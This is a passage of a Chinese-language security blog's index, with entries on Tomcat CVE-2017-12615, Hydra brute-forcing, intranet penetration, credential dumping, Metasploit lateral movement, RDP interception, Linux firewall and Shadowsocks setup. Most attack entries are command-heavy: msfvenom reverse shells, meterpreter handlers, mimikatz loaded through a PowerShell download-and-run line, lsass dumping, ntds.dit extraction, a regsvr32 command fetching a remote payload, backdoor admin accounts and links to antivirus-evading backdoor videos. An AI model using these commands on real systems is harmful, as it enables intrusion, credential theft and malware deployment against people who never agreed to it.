Advanced Penetration Testing: Hacking the World’s Most Secure Networks Social Engieers’ Playbook Pretical Pretexting ↑ Training ( Free ) Tradecraft - a course on red team operations Advanced Threat Tactics Course &amp; Notes ↑ Certification CREST Certified Simulated Attack Specialist CREST Certified Simulated Attack Manager SEC564: Red Team Operations and Threat Emulation ELearn Security Penetration Testing eXtreme]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-12615漏洞复现]]></title>
    <url>%2F2019%2F02%2F28%2FCVE-2017-12615.html</url>
    <content type="text"><![CDATA[漏洞利用条件和方式: CVE-2017-12615漏洞利用需要在Windows环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。 CVE-2017-12616影响范围：Apache Tomcat 7.0.0 - 7.0.80 CVE-2017-12615影响范围： Apache Tomcat 7.0.0 - 7.0.79 安装tomcat U:test P:test123 JAVA_HOME= C:\Program Files\Java\jdk1.7.0_25 CLASSPATH= .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; Path= %JAVA_HOME%/bin 新增2个变量 CATALINA_HOME= tomcat路径 CATALINA_BASE= tomcat路径 CLASSPATH=;%TALINA_HOME%\common\lib\servlet.jar 1、开始—-控制面板—-系统和安全—-windows防火墙—-高级设置 2、选择“入站规则”—-点击“新建规则”—-“规则类型”选择“端口”—-“下一步”—-该规则应用于，选择“TCP”—-“特定本地端口”输入“8080”(Tomcat使用的端口)—-“下一步”—-选择“允许连接”，点击“下一步”—-何时应用该规则，默认全选，点击“下一步”—-为该规则起一个名称，如“Tomcat开放8080端口”—-点击“完成” 3、Server.xml 123&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;connectionTimeout=&quot;20000&quot;redirectPort=&quot;8443&quot; address=&quot;0.0.0.0&quot; /&gt; C:\Program Files\Apache Software Foundation\Tomcat 7.0\conf\web.xml 增加 123456 &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt; 提示 404。通过描述中的 Windows 受影响，可以结合 Windows 的特性。其一是 NTFS 文件流，其二是文件名的相关限制（如 Windows 中文件名不能以空格结尾）来绕过限制： 7.0.81]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hydra 的使用]]></title>
    <url>%2F2019%2F02%2F26%2Fhydra-%E7%9A%84%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[字典集https://www.weakpass.com/1.破解ssh（1）破解指定用户名密码 hydra ip ssh -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ssh -l 用户名 -P 密码字典 -e ns -vV （2）批量破解ssh账号和密码 hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ssh -Vhydra -L list_user -P list_password 192.168.56.101 ssh -V 2.破解ftp （1）破解指定用户名密码 hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ftp -l 用户名 -P 密码字典 -e ns -vV （2）批量破解FTP账号和密码 hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ftp -Vhydra -L list_user -P list_password 192.168.56.101 ftp -V 3．GET方式提交，破解Web登录 hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php 4．POST方式提交，破解Web登录4．POST方式提交，破解Web登录 （1）hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php: username= ^USER^ &amp;password=^PASS^&amp;submit=login:sorry password” hydra -L list_user -P list_password 192.168.0.115 http-post-form “member.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failed” –V （2）对admin密码进行破解 hydra -t 3 -l admin -P pass.txt -o out.txt -f 192.168.0.115 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:wrong username or password“ “-t”表示同时线程数为3；“-l”表示用户名是“admin”，字典为pass.txt，保存为out.txt；“-f”表示破解1个密码就停止；“192.168.0.115”表示目标IP地址；“http-post-form”表示采用HTTP的POST方式提交表单密码破解； 5．破解HTTPS hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https 6．破解teamspeak hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 7．破解Cisco hydra -P pass.txt 192.168.0.115 ciscohydra -m cloud -P pass.txt 192.168.0.115 cisco-enable 8．破解SMB hydra -l administrator -P pass.txt 192.168.0.115 smb 9．破解POP3 hydra -l muts -P pass.txt my.pop3.mail pop3 10．破解远程终端账号 （1）破解管理员账号 hydra ip rdp -l administrator -P pass.txt -V （2）批量破解账号 hydra -s 3389 192.168.44.138 rdp -L user.txt -P pwd.txt –V 11．破解HTTP-Proxy hydra -l admin -P pass.txt http-proxy://192.168.0.115 12．破解IMAP hydra -L user.txt -p secret 192.168.0.115 imap PLAINhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>hydra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透小记]]></title>
    <url>%2F2019%2F02%2F26%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8F%E8%AE%B0.html</url>
    <content type="text"><![CDATA[常用一句话webshellhttps://github.com/tennc/webshell 信息收集1234567891011121314151617181920212223242526272829303132333435363738dnscmd &lt;servername&gt; /ZonePrint &lt;zonename&gt; 查看dns列表（DC执行）tasklist /SVC 查看系统进程及其描述query user || qwinsta 查看当前在线用户net user 查看本机用户net user /domain 查看域用户net view &amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二个查的更多net view /domain 查看有几个域net view \\\\dc 查看 dc 域内共享文件net group /domain 查看域里面的组net group &quot;domain admins&quot; /domain 查看域管net localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管net group &quot;domain controllers&quot; /domain 域控net time /domain net config workstation 当前登录域 - 计算机名 - 用户名net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源ipconfigsysteminfotasklist /svc 详细进程信息tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklisttaskkill /im imagename /f 结束进程net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组netstat -anonltest /dclist:xx 查看域控nltest /domain_trusts 查看域信任信息whoami /all 查看 Mandatory Label uac 级别和 sid 号net sessoin 查看远程连接 session (需要管理权限)net share 共享目录cmdkey /l 查看保存登陆凭证echo %logonserver% 查看登陆域spn –l administrator spn 记录set 环境变量dsquery server - 查找目录中的 AD DC/LDS 实例dsquery user - 查找目录中的用户dsquery computer 查询所有计算机名称 windows 2003dir /s *.exe 查找指定目录下及子目录下没隐藏文件arp -atracert 查路由 windows 下载文件 bitsadmin 12download文件bitsadmin /transfer n https://www.baidu.com/robots.txt c:\1.txt powershell 12345一条命令download文件powershell (new-object System.Net.WebClient).DownloadFile('https://www.baidu.com/robots.txt','C:\1.txt')多条命令download文件$client = new-object System.Net.WebClient$client.DownloadFile('https://www.baidu.com/robots.txt', 'C:\1.txt') certutil.exe 1cmd.exe /c certutil.exe -urlcache -split -f https://www.baidu.com/robots.txt 添加删除用户操作 12net user admin1 P@ssw0rd /add &amp; net localgroup administrators admin1 /add 添加用户并设置管理员net user admin1 /del 内网代理工具EWtools:http://rootkiter.com/EarthWorm正向：被攻击机(跳板)： ./ew_for_Linux -s ssocksd -l 9999 (侦听 0.0.0.0:9999)netstat -pantu|grep 9999 (查看是否侦听成功) 攻击机： proxychain 设置 socks5 为跳板 ip portproxychain nmap 即可以用跳板代理扫描其他主机 netsh Windows 自带工具 windows 端口转发123netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=53 connectaddress=10.10.10.4 connectport=8880netsh interface portproxy show v4tov4netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=53 MSF反弹 shell msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe 1.生成一个回连木马 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=443 -f dll&gt;/root/Desktop/443.dll 2.生成木马后，我们在菜刀里放入生成的木马，运行，同时打开msf准备回连 use exploit/multi/handler set payload windows/meterpreter/reverse_tcpset LHOST 192.168.2.111set lport 443run 4.提权 background 或 ctrl+z use exploit/windows/local/ms11_080_afdjoinleafset session 1runhashdump //密码获取load mimikatz //使用mimikatzkerberos //查看解密 5.新加路由查看子网 routebackgroundsessionsroute add 192.168.2.0 255.255.255.0 2search mssql //找mssql模块use auxiliary/scanner/mssql/mssql_login //使用login模块 show options set rhosts 192.168.177.1/24 set password sa@123runshow optionsset BEUTEFORCE_SPEED 0run 端口扫描search portscan use auxiliary/scanner/portscan/tcp //使用scanner模块show optionsset RHOSTS 192.168.2.0/24set ports 139,445,3389 //设置扫描端口 ipc$ D:&gt;net use \192.168.1.254\c$ “pwd” /user:user //连接192.168.1.254的IPC$共享，用unc路径D:&gt;copy srv.exe \192.168.1.254\c$ //复制本地 srv.exe 到C根目录D:&gt;net time \192.168.1.254 //查时间D:&gt;at \192.168.1.254 10:50 srv.exe //用at命令在10点50分启动 srv.exeD:&gt;net use \192.168.1.254\c$ /del]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hashcat Readme]]></title>
    <url>%2F2019%2F01%2F18%2Fhashcat-readme.html</url>
    <content type="text"><![CDATA[#################################################################&amp; hashcat4.0.1 or 4.1.0 &amp; ################################################################# hash r.txt文件格式 用户名:hash –show 导出已破解的用户名:密码 outr.txt hashcat64.exe -a 3 -m 1000 –show –outfile=C:\Users\hash\Desktop\outr.txt –outfile-format 3 –username c:\Users\hash\Desktop\r.txt –left 导出未破解的用户名:hash leftr.txt hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr.txt –outfile-format 1 –username c:\Users\hash\Desktop\r.txt 增加密码复杂度命令破解leftr.txt（未破解的用户名:hash） hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\outr1.txt –outfile-format 3 –username c:\Users\hash\Desktop\leftr.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force 结束以后导出未爆破用户名加hash.txt hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr2.txt –outfile-format 1 –username c:\Users\hash\Desktop\leftr.txt hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\out-1.txt –outfile-format 3 –username c:\Users\hash\Desktop\1.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[抓取 Windows 用户或者域用户 hash 的多种姿势]]></title>
    <url>%2F2018%2F10%2F18%2F%E6%8A%93hash.html</url>
    <content type="text"><![CDATA[抓取 Windows 用户或者域用户 hash 的多种姿势 Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。第二个加密步骤是为了执行密码转储以进行审计，需要两个文件的副本。 执行密码安全审核所需的主要步骤是获取包含信息的文件，从文件中转储密码哈希值，然后使用密码破解程序测试弱密码的这些哈希值。 通过获取Ntds.dit和SYSTEM文件的副本，最可靠的执行密码审计的方法是脱机的。由于Windows阻止这些操作阻止标准读取或复制，因此必须使用特殊技术来获取副本。 使用mimikatz本机测试直接获取内存中的明文密码 mimikatz 只能抓取登陆过的用户hash，无法抓取所有用户,需要免杀 12privilege::debugsekurlsa::logonpasswords 非交互式抓明文密码(webshell中) 1mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" &gt; password.txt powershell加载mimikatz抓取密码 1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz ProcDump + Mimikatz ==ps:mimikatz的平台（platform）要与进行dump的系统(source dump)兼容(比如目标08的,本地就要用08系统来分析)== 远程主机： 12Procdump.exe -accepteula -ma lsass.exe c:\a.dmp 或者任务管理器找到lsass.exe进程右键创建转储文件 本地主机：mimikatz 12sekurlsa::minidump a.dmpsekurlsa::logonpasswords full ntds.dit 的导出 ntdsutil win2008开始DC中自带的工具交互式12345678ntdsutilsnapshotactivate instance ntdscreatemount [GUID]//copy 完之后再执行unmout [GUID]del [GUID] 非交互1234ntdsutil snapshot "activate instance ntds" create quit quitntdsutil snapshot "mount &#123;GUID&#125;" quit quitcopy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.ditntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit QuarkPwDump分析 https://github.com/quarkslab/quarkspwdump 在线提取（直接在目标主机执行，实战中不选择此方式。）1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit 离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取 1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt WINDOWS SERVER 2008-2016123456C:\&gt; ntdsutilntdsutil: activate instance ntdsntdsutil: ifmifm: create full c:\auditifm: quitntdsutil: quit 解出ntds的hash 1NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;SYSTEM&quot; -p pwdump.txt --users-csv users.csv NtdsAudit.exe下载地址 NtdsAudit需要ntds.dit Active Directory数据库，SYSTEM 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置ntdsutil实用程序。 以管理员身份打开命令提示符（cmd.exe）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。 在命令提示符下，键入以下命令，然后按ENTER键： 1ntdsutil 在ntdsutil提示符下，键入以下命令，然后按Enter： 1activate instance ntds 在ntdsutil提示符下，键入以下命令，然后按Enter： 1ifm 在ifm提示符下，键入以下命令，然后按Enter： 1create full &lt;Drive&gt;:\&lt;Folder&gt; &lt;Drive&gt;:\&lt;Folder&gt; 是要创建的文件的文件夹路径。 例如，以下命令将显示统计信息，输出pwdump.txt包含密码哈希值的文件，并输出users.csv包含每个用户帐户详细信息的文件。 1ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv Linux 明文密码的获取mimipenguin git clone https://github.com/huntergregal/mimipenguin 支持的操作系统 os service supported Ubuntu Desktop 12.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Ubuntu Desktop 16.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Fedora Workstation 25 (x86_64) gnome-keyring-daemon (3.20.0) Y Fedora Workstation 27 (x86_64) gnome-keyring-daemon (3.20.1) Y Kali-rolling x64 gnome-keyring-daemon (3.28.0.2) Y]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows linux 应急响应流程及实战演练]]></title>
    <url>%2F2018%2F10%2F17%2Fwindows%20linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html</url>
    <content type="text"><![CDATA[当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。 windows 应急流程及实战演练 Linux 应急响应流程及实战演练]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建域环境]]></title>
    <url>%2F2018%2F10%2F16%2F%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
    <content type="text"><![CDATA[域环境搭建 准备： DC: Windows 2008 server R2 DM: Windows 2003 server SP2 Windows 2008 server R2 (域控) 1、修改计算机名： 可以改成DC或者其他什么看着顺眼的名字，默认也行，就是搭建好域以后再改可能会遇到一些问题； 2、配置固定ip: 我虚拟机使用的桥接方式，并且路由器是192.168.3.1，所以在这如此设置，此处的DNS填写本机即，127.0.0.1； 3、服务器管理器—角色：安装Active Directory 域服务并且会同时要求安装DNS服务器； 4、配置域服务:打开服务器管理器或者在运行框下输入 dcpromo直接进行配置，选择新建， Ps：这里可能会因为本地administrator的密码规则不合要求，导致安装失败，改一个强密码； 5、设置林根域： 林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生 具体见：http://angerfire.blog.51cto.com/198455/144123/ 6、域数据存放的地址：默认即可。 DM: Windows 2003 server SP2 1、如果新安装的虚拟机安装时会有选择项是加入域还是组，我这里选择加入域，会让登录当前域的账号密码即“Domaim\administrator”（必须是域账号不是administrator）和对应密码；已有的Windows2003加入域，首先更改组为域选择正确的domain和domain账号密码即可。 2、安装成功后配置静态IP，DNS处填写DC的IP； 3、在2003上执行net time显示如图，说明已经加入域，并且在Windows2008上的domain.com域，控制器上可以看到03的机器； 域已经搭建完成，主域控会生成一个 krbtgt账号，他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证。]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过MSF使用SMB端口远程连接目标的技巧]]></title>
    <url>%2F2018%2F10%2F16%2Fmsf%20smb.html</url>
    <content type="text"><![CDATA[前言 内网渗透中获得管理员用户名密码之后，通过SMB端口445来与目标机器的设备建立连接的后渗透技巧。 exploit/windows/smb/psexecmsf &gt; use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; set rhost 192.168.2.118msf exploit(windows/smb/psexec) &gt; set smbuser administratormsf exploit(windows/smb/psexec) &gt; set smbpass P@ssw0rdmsf exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec) &gt; set LHOST 192.168.2.145msf exploit(windows/smb/psexec) &gt; set LPORT 4444msf exploit(windows/smb/psexec) &gt; exploit 执行后有一个session回连经实验表明，使用本地账户即使是管理员权限也不能使用此方法得到一个 meterpreter ，只能使用 administrator 的用户名密码才能回来一个 session ；当在域环境使用时，smbuser 不是写成domain/administrator （这样的用户名是Exploit failed 执行不成功的）而是写成 administrator ，并且只要是域管理员都能执行成功并反弹一个 meterpreter 的 session 。 exploit/windows/smb/psexec_pshmsf &gt; use exploit/windows/smb/psexec_pshmsf exploit(windows/smb/psexec_psh) &gt; set rhost 192.168.2.118msf exploit(windows/smb/psexec_psh) &gt; set smbuser administratormsf exploit(windows/smb/psexec_psh) &gt; set smbpass P@ssw0rdmsf exploit(windows/smb/psexec_psh) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec_psh) &gt; set lhost 192.168.2.145msf exploit(windows/smb/psexec_psh) &gt; set lport 4444msf exploit(windows/smb/psexec_psh) &gt; exploit exploit/multi/script/web_delivery使用exploit/multi/script/web_delivery 生成恶意dll代码 12345678910111213141516171819202122msf &gt; use exploit/multi/script/web_delivery msf exploit(multi/script/web_delivery) &gt; show targets Exploit targets: Id Name--- 0 Python 1 PHP 2 PSH 3 Regsvr32 4 PSH (Binary)msf exploit(multi/script/web_delivery) &gt; set target 3msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) &gt; set lhost 192.168.2.145msf exploit(multi/script/web_delivery) &gt; set lport 4444msf exploit(multi/script/web_delivery) &gt; exploit [*] Exploit running as background job 0.[*] Started reverse TCP handler on 192.168.2.145:4444 [*] Using URL: http://0.0.0.0:8080/s7sa27EEtl[*] Local IP: http://192.168.2.145:8080/s7sa27EEtl[*] Server started.[*] Run the following command on the target machine:regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll auxiliary/admin/smb/psexec_command使用 auxiliary/admin/smb/psexec_command 在远程目标上执行命令种恶意 dll 回连 meterpreter ；msf &gt; use auxiliary/admin/smb/psexec_commandmsf auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.2.118msf auxiliary(admin/smb/psexec_command) &gt; set smbuser admin1msf auxiliary(admin/smb/psexec_command) &gt; set smbpass P@ssw0rdmsf auxiliary(admin/smb/psexec_command) &gt; set command regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dllmsf auxiliary(admin/smb/psexec_command) &gt; set payload windows/meterpreter/reverse_tcpmsf auxiliary(admin/smb/psexec_command) &gt; set lhost 192.168.2.145msf auxiliary(admin/smb/psexec_command) &gt; set lport 4444msf auxiliary(admin/smb/psexec_command) &gt; exploit 经实验表明，当目标机器有杀毒软件的时候，会拦截其从服务器上下载恶意 dll 文件 s7sa27EEtl.sct （测试机为赛门铁克未授权版），毕竟 msf 的恶意dll 特征码已经被杀毒引擎收录，如果确定目标机其没有杀软便可使用。 auxiliary/scanner/smb/impacket/wmiexecmsf auxiliary(admin/smb/psexec_command) &gt; use auxiliary/scanner/smb/impacket/wmiexecmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; set rhosts 192.168.2.118msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbuser admin1msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbpass P@ssw0rdmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; set command ipconfig /allmsf auxiliary(scanner/smb/impacket/wmiexec) &gt; exploit]]></content>
      <categories>
        <category>MSF</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7 安装 Shadowscoks]]></title>
    <url>%2F2018%2F07%2F31%2FCentOS-7-%E5%AE%89%E8%A3%85-shadowscoks.html</url>
    <content type="text"><![CDATA[首先安装 pip ，使用 pip 安装 Shadowsocks 1234yum updateyum upgradeyum install python-pippip install shadowsocks 新建 Shadowsocks 的配置文件 1vim /etc/shadowsocks.json 编辑 Shadowocks 配置文件 12345678910&#123; "server":"0.0.0.0", "server_port":1111, "local_address":"127.0.0.1", "local_port":1080, "password":"yourpassword", "timeout":300, "method":"aes-256-cfb", "fast_open": false&#125; 配置firewall，允许 Shadowsocks 服务端口被外网访问 1234以下命令会永久生效firewall-cmd --zone=public --add-port=1111/tcp --permanent重新载入 firewallfirewall-cmd --reload 启动 ssserver 服务 123ssserver -c /etc/shadowsocks.json -d startssserver -c /etc/shadowsocks.json -d restartssserver -c /etc/shadowsocks.json -d stop]]></content>
      <categories>
        <category>vps，SS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>shadowscoks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS7 使用 Firewalld 打开关闭防火墙与端口]]></title>
    <url>%2F2018%2F07%2F31%2FCentOS7_firewalld.html</url>
    <content type="text"><![CDATA[firewalld的基本使用 12345启动： systemctl start firewalld （service firewalld start）关闭： systemctl stop firewalld （service firewalld stop）查看状态： systemctl status firewalld 开机禁用 ： systemctl disable firewalld开机启用 ： systemctl enable firewalld systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。123456789启动一个服务：systemctl start firewalld.service关闭一个服务：systemctl stop firewalld.service重启一个服务：systemctl restart firewalld.service显示一个服务的状态：systemctl status firewalld.service在开机时启用一个服务：systemctl enable firewalld.service在开机时禁用一个服务：systemctl disable firewalld.service查看服务是否开机启动：systemctl is-enabled firewalld.service查看已启动的服务列表：systemctl list-unit-files|grep enabled查看启动失败的服务列表：systemctl --failed 配置firewalld-cmd12345678910查看版本： firewall-cmd --version查看帮助： firewall-cmd --help显示状态： firewall-cmd --state查看所有打开的端口： firewall-cmd --zone=public --list-ports更新防火墙规则： firewall-cmd --reload查看区域信息: firewall-cmd --get-active-zones查看指定接口所属区域： firewall-cmd --get-zone-of-interface=eth0拒绝所有包：firewall-cmd --panic-on取消拒绝状态： firewall-cmd --panic-off查看是否拒绝： firewall-cmd --query-panic 对一个端口的开启/查看/删除操作1234添加: firewall-cmd --zone=public --add-port=444/tcp --permanent (--permanent永久生效，没有此参数重启后失效)重新载入: firewall-cmd --reload查看: firewall-cmd --zone=public --query-port=444/tcp删除: firewall-cmd --zone=public --remove-port=444/tcp --permanent]]></content>
      <categories>
        <category>Linux命令</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>firewall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过降级连接劫持RDP明文凭据]]></title>
    <url>%2F2018%2F05%2F03%2Fseth.html</url>
    <content type="text"><![CDATA[Seth是一种用Python和Bash编写的工具，用于通过尝试降级连接以提取明文凭据来进行MitM RDP连接。它的开发目的是为了提高认识，并在笔试，讲习班或会谈的背景下教育正确配置的RDP连接的重要性。作者是Adrian Vollmer（SySS GmbH）。 用法：123456$ ./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER IP&gt; &lt;VICTIM IP&gt; &lt;GATEWAY IP|HOST IP&gt; [&lt;COMMAND&gt;]实例：./seth.sh 网口 攻击者IP 访问RDP IP 被攻击者IP &lt;命令执行一般不用&gt;./seth.sh eth0 192.168.3.149 192.168.3.150 192.168.3.138与上面命令等价（如果所有机器在同一网段可用）：./seth.sh eth0 192.168.3.&#123;149,150,138&#125; 测试： 项目地址：Seth 攻击者机器：kali 192.168.3.149 访问RDP机器：win 7 x64 192.168.3.150 被攻击者机器：win 10 x64 192.168.3.138 欺骗ARP回复 启用IPv4流量转发，将流量从受害主机重定向到攻击者机器，然后再转发到目标RDP服务器。 配置一个iptable规则拒绝SYN数据包，以防止直接的RDP认证。 捕获目标主机的SYN数据包。 克隆SSL证书。重新配置iptables规则，以将流量从受害工作站路由到目标RDP主机。 阻止到端口88的流量，以将Kerberos身份验证降级到NTLM。 seth 执行完的界面： 访问RDP的机器弹出，尝试通过RDP向目标服务器进行身份验证的用户将会收到以下消息： 成功获取被攻击者RDP的用户名密码： 当以下复选框未选中时被攻击者可以直接登录系统，并且seth可以进行键盘记录。 备注： 当我使用win 10 做为访问攻击目标RDP的机器时，win 10 直接报错 ，攻击机器显示类似“请确认加密方式是不是xxx”，不能抓到密码（也可能是我环境的问题）。 使用win 7 做为访问攻击目标RDP的机器，弹出ssl认证那个，未报错，只是进不去mstsc，重新登录即可（攻击机已经断开监听所以可以正常登录）。 使用win 8 做为访问攻击目标RDP的机器，弹出ssl认证那个，报错（但是不影响，点击重新登录即可登录成功）。]]></content>
      <categories>
        <category>内网渗透</category>
        <category>RDP攻击</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>RDP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TheFatRat YouTube 视频]]></title>
    <url>%2F2018%2F04%2F27%2Fbypass-av.html</url>
    <content type="text"><![CDATA[TheFatRat Screetsec Channel : https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw Udate thefatrat v1.8 https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 file Pumper in linux with fatrat https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8 Kali linux 2016.2 | Setup FatRat and Bypass Windows 10 :https://www.youtube.com/watch?v=mkfKSCxvPec Embed Backdoor Apk Andoird : https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be Create Backdoor Php and Reconnect With TheFatRat : https://www.youtube.com/watch?v=gfS55fjd8Fg THEFATRAT:BACKDOOR CREATOR &amp; BYPASS ANTIVIRUS AND INSTALL. : https://www.youtube.com/watch?v=C4YHVKPw6Zo Exploit Windows 7/8/10 using Thefatrat ( option 2 ) : https://www.youtube.com/watch?v=-WbKOxIl_f4 How to hack android device with FatRat on kali linux 2 :https://www.youtube.com/watch?v=yUuwnu-NUXE Kali Linux Tools - TheFatRat Tool For Generate Backdoor with MsfVenom : https://www.youtube.com/watch?v=7PMfPbrM0o4 FUD 100 % Backdoor With TheFatRat pt.1 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=8lJBwclFwJI FUD 100 % Backdoor With TheFatRat pt.2 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s FUD 100 % Backdoor With TheFatRat pt.3 [ PwnWinds ][ Bypass Antivirus ] : https://www.youtube.com/watch?v=wCzsD6vt9CQ TheFatrat Backdoor Undetectable by Antivirus Kali linux part 3 :https://www.youtube.com/watch?v=wuOCDn0NvWc 1000 % FUD Backdoor with TheFatRat Tool : https://www.youtube.com/watch?v=vPXWv0jaBEQ How To Use TheFatRat To Create Backdoor In Kali Rolling [FUD 100%] : https://www.youtube.com/watch?v=26tSOuPcpZk Backdoor (Virus) 100% 